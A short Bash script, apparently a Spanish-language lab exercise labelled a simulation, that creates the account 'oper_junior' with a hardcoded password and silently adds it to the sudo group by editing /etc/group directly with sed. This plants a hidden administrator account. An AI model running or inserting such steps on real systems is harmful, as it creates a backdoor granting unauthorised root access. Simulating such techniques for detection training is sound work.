#!/bin/bash
# Ejercicio 7: Modificación Silenciosa de Grupos Críticos (/etc/group)
useradd -m -s /bin/bash oper_junior 2>/dev/null
echo "oper_junior:JuniorPass2026" | chpasswd
# Modifica directamente la línea del grupo sudo en /etc/group
sed -i '/^sudo:x:27:/ s/$/,oper_junior/' /etc/group
echo "Simulación 7 completada."
